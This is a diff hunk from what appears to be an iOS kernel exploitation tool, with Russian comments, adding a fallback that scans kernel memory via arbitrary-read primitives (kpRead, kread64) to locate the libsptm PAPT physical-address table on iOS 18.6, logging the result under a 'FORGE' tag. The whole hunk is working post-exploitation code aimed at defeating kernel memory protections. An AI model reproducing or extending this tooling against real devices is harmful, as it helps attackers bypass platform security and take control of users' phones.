@@ -7931,6 +7931,26 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint32_t uoff = (uint32_t)(ucF & 0x3fff);
                 uint64_t pagePA = kvtophys(pageVA);
                 int errF = errno;
+                // 1.9.273: PAPT-override в авто-цепи не установлен (EXP-03 живёт в
+                // кнопке дампа), а сток-точка на 18.6 = stub → kpZoneVtoP падал с 0.
+                // Контент-охота прямо здесь (р.63/69: zone-map покрыт резолвером
+                // ядра — таблица существует). 24-B формат: {PA, VA, npages}.
+                if (!pagePA && !kp_papt_table_va) {
+                    NSArray<NSNumber *> *pts = [self libsptmBlockPointeesWithLog:nil];
+                    for (NSNumber *pv in pts) {
+                        uint64_t cand = pv.unsignedLongLongValue;
+                        uint8_t f2[48];
+                        memset(f2, 0, sizeof(f2));
+                        if (!kpRead(cand, f2, sizeof(f2), "papt hunt", nil)) continue;
+                        if (kpPaptEntryPlausible(f2) && kpPaptEntryPlausible(f2 + 24)) {
+                            kp_papt_table_va = cand; kp_papt_format = 0;
+                            kp_papt_table_n = kread32(kread64(ksymbol(libsptm_n_papt_ranges)));
+                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] PAPT найдена контент-охотой @ %#llx (n=%llu)",
+                                      (unsigned long long)cand, (unsigned long long)kp_papt_table_n]);
+                            break;
+                        }
+                    }
+                }
                 // 1.9.251 (р.63): walker ветки VM/RO охраняется deadly-таблицами
                 // (census 0x15) → pagePA=0. Fallback — PAPT/арена ядра (kpZoneVtoP).
                 if (!pagePA) pagePA = kpZoneVtoP(pageVA);
